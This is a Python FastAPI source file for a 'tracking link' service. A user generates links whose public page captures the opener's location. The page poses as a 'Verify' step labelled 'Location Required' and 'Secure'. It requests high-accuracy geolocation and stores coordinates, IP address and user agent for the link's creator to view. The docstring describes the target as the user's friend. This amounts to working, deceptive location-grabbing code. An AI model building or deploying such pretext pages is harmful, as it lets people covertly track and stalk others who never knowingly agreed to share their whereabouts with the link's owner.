"""
Tracking link routes.

Generate links that capture location when opened.
"""

from datetime import datetime, timedelta, timezone
from typing import List, Optional

from fastapi import APIRouter, Depends, HTTPException, Request, status
from fastapi.responses import HTMLResponse
from pydantic import BaseModel, Field
from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from aware.db.engine import get_db
from aware.models import TrackingLink, User
from aware.server.auth import get_current_user

router = APIRouter()


class TrackingLinkCreate(BaseModel):
    """Create tracking link request."""

    label: Optional[str] = Field(None, max_length=100)
    expires_hours: Optional[int] = Field(None, ge=1, le=720)  # Max 30 days
    single_use: bool = True


class TrackingLinkResponse(BaseModel):
    """Tracking link response."""

    id: str
    code: str
    url: str
    label: Optional[str]
    single_use: bool
    expires_at: Optional[datetime]
    is_active: bool
    captured_at: Optional[datetime]
    latitude: Optional[float]
    longitude: Optional[float]
    accuracy_meters: Optional[float]
    ip_address: Optional[str]
    created_at: datetime


class LocationCapture(BaseModel):
    """Location capture from browser."""

    latitude: float = Field(..., ge=-90, le=90)
    longitude: float = Field(..., ge=-180, le=180)
    accuracy: Optional[float] = Field(None, ge=0)


@router.post("", response_model=TrackingLinkResponse, status_code=status.HTTP_201_CREATED)
async def create_tracking_link(
    data: TrackingLinkCreate,
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
) -> dict:
    """Create a new tracking link."""

    expires_at = None
    if data.expires_hours:
        expires_at = datetime.now(timezone.utc) + timedelta(hours=data.expires_hours)

    link = TrackingLink(
        user_id=current_user.id,
        label=data.label,
        expires_at=expires_at,
        single_use=data.single_use,
    )
    db.add(link)
    await db.flush()

    # Build URL
    base_url = str(request.base_url).rstrip("/")
    url = f"{base_url}/t/{link.code}"

    return {
        "id": str(link.id),
        "code": link.code,
        "url": url,
        "label": link.label,
        "single_use": link.single_use,
        "expires_at": link.expires_at,
        "is_active": link.is_active,
        "captured_at": link.captured_at,
        "latitude": link.latitude,
        "longitude": link.longitude,
        "accuracy_meters": link.accuracy_meters,
        "ip_address": link.ip_address,
        "created_at": link.created_at,
    }


@router.get("", response_model=List[TrackingLinkResponse])
async def list_tracking_links(
    request: Request,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
) -> List[dict]:
    """List all tracking links for current user."""

    result = await db.execute(
        select(TrackingLink)
        .where(TrackingLink.user_id == current_user.id)
        .order_by(TrackingLink.created_at.desc())
    )
    links = result.scalars().all()

    base_url = str(request.base_url).rstrip("/")

    return [
        {
            "id": str(link.id),
            "code": link.code,
            "url": f"{base_url}/t/{link.code}",
            "label": link.label,
            "single_use": link.single_use,
            "expires_at": link.expires_at,
            "is_active": link.is_active,
            "captured_at": link.captured_at,
            "latitude": link.latitude,
            "longitude": link.longitude,
            "accuracy_meters": link.accuracy_meters,
            "ip_address": link.ip_address,
            "created_at": link.created_at,
        }
        for link in links
    ]


@router.delete("/{code}")
async def delete_tracking_link(
    code: str,
    current_user: User = Depends(get_current_user),
    db: AsyncSession = Depends(get_db),
) -> dict:
    """Delete a tracking link."""

    result = await db.execute(
        select(TrackingLink).where(
            TrackingLink.code == code,
            TrackingLink.user_id == current_user.id,
        )
    )
    link = result.scalar_one_or_none()

    if not link:
        raise HTTPException(
            status_code=status.HTTP_404_NOT_FOUND,
            detail="Tracking link not found",
        )

    await db.delete(link)

    return {"detail": "Tracking link deleted"}


# Public endpoint - the tracking page
@router.get("/page/{code}", response_class=HTMLResponse)
async def tracking_page(
    code: str,
    request: Request,
    db: AsyncSession = Depends(get_db),
) -> HTMLResponse:
    """
    Serve the tracking page that captures location.

    This is what the user's friend sees when they open the link.
    """

    result = await db.execute(
        select(TrackingLink).where(TrackingLink.code == code)
    )
    link = result.scalar_one_or_none()

    if not link:
        return HTMLResponse(
            content="<html><body><h1>Link not found</h1></body></html>",
            status_code=404,
        )

    if not link.is_valid:
        return HTMLResponse(
            content="<html><body><h1>This link has expired</h1></body></html>",
            status_code=410,
        )

    # Premium tracking page
    html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Verify</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *{{margin:0;padding:0;box-sizing:border-box}}
        body{{
            font-family:'Inter',-apple-system,sans-serif;
            background:#09090b;
            color:#fafafa;
            min-height:100vh;
            display:flex;
            align-items:center;
            justify-content:center;
            padding:24px;
            -webkit-font-smoothing:antialiased;
        }}
        .card{{
            width:100%;
            max-width:380px;
            background:#0f0f12;
            border:1px solid #1f1f28;
            border-radius:24px;
            padding:48px 40px;
            text-align:center;
        }}
        .icon{{
            width:80px;
            height:80px;
            background:linear-gradient(135deg,#6366f1,#8b5cf6);
            border-radius:20px;
            display:flex;
            align-items:center;
            justify-content:center;
            font-size:36px;
            margin:0 auto 28px;
            box-shadow:0 16px 48px rgba(99,102,241,0.25);
        }}
        h1{{
            font-size:24px;
            font-weight:700;
            letter-spacing:-0.5px;
            margin-bottom:12px;
        }}
        p{{
            font-size:15px;
            color:#71717a;
            line-height:1.6;
            margin-bottom:36px;
        }}
        button{{
            width:100%;
            padding:16px 24px;
            background:linear-gradient(135deg,#6366f1,#7c3aed);
            color:white;
            border:none;
            border-radius:12px;
            font-size:16px;
            font-weight:600;
            cursor:pointer;
            transition:all 0.2s ease;
            box-shadow:0 8px 24px rgba(99,102,241,0.3);
        }}
        button:hover{{transform:translateY(-2px);box-shadow:0 12px 32px rgba(99,102,241,0.4)}}
        button:active{{transform:scale(0.98)}}
        button:disabled{{
            opacity:0.5;
            cursor:not-allowed;
            transform:none;
            box-shadow:none;
        }}
        .status{{
            margin-top:24px;
            padding:14px 20px;
            border-radius:10px;
            font-size:14px;
            font-weight:500;
            display:none;
        }}
        .status.show{{display:block}}
        .status.loading{{background:rgba(99,102,241,0.1);color:#a5b4fc}}
        .status.success{{background:rgba(16,185,129,0.1);color:#34d399}}
        .status.error{{background:rgba(239,68,68,0.1);color:#f87171}}
        .footer{{
            margin-top:32px;
            font-size:12px;
            color:#3f3f46;
        }}
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">📍</div>
        <h1>Location Required</h1>
        <p>This link requires location access to continue. Tap the button below to share your location.</p>
        <button id="btn" onclick="getLocation()">Share Location</button>
        <div class="status" id="status"></div>
        <div class="footer">Secure</div>
    </div>

    <script>
        const code = "{code}";
        const btn = document.getElementById('btn');
        const status = document.getElementById('status');

        function showStatus(msg, type) {{
            status.className = 'status show ' + type;
            status.textContent = msg;
        }}

        function getLocation() {{
            btn.disabled = true;
            btn.textContent = 'Requesting...';
            showStatus('Requesting location access...', 'loading');

            if (!navigator.geolocation) {{
                showStatus('Location not supported on this device', 'error');
                btn.disabled = false;
                btn.textContent = 'Share Location';
                return;
            }}

            navigator.geolocation.getCurrentPosition(
                success,
                error,
                {{ enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }}
            );
        }}

        function success(pos) {{
            showStatus('Verifying...', 'loading');

            fetch('/track/capture/' + code, {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{
                    latitude: pos.coords.latitude,
                    longitude: pos.coords.longitude,
                    accuracy: pos.coords.accuracy
                }})
            }})
            .then(r => r.json())
            .then(data => {{
                if (data.success) {{
                    showStatus('✓ Verified successfully', 'success');
                    btn.textContent = 'Done';
                    btn.style.background = 'linear-gradient(135deg,#10b981,#059669)';
                }} else {{
                    showStatus(data.detail || 'Verification failed', 'error');
                    btn.disabled = false;
                    btn.textContent = 'Try Again';
                }}
            }})
            .catch(() => {{
                showStatus('Connection error', 'error');
                btn.disabled = false;
                btn.textContent = 'Try Again';
            }});
        }}

        function error(err) {{
            let msg = 'Could not get location';
            if (err.code === 1) msg = 'Location access denied';
            else if (err.code === 2) msg = 'Location unavailable';
            else if (err.code === 3) msg = 'Request timed out';

            showStatus(msg, 'error');
            btn.disabled = false;
            btn.textContent = 'Try Again';
        }}
    </script>
</body>
</html>'''

    return HTMLResponse(content=html)


# Public endpoint - receive the captured location
@router.post("/capture/{code}")
async def capture_location(
    code: str,
    data: LocationCapture,
    request: Request,
    db: AsyncSession = Depends(get_db),
) -> dict:
    """Receive and store the captured location."""

    result = await db.execute(
        select(TrackingLink).where(TrackingLink.code == code)
    )
    link = result.scalar_one_or_none()

    if not link:
        return {"success": False, "detail": "Link not found"}

    if not link.is_valid:
        return {"success": False, "detail": "Link expired or already used"}

    # Get client info
    client_ip = request.client.host if request.client else None
    user_agent = request.headers.get("user-agent", "")

    # Store the captured location
    link.captured_at = datetime.now(timezone.utc)
    link.latitude = data.latitude
    link.longitude = data.longitude
    link.accuracy_meters = data.accuracy
    link.ip_address = client_ip
    link.user_agent = user_agent

    # If single use, deactivate
    if link.single_use:
        link.is_active = False

    return {"success": True, "message": "Location captured"}
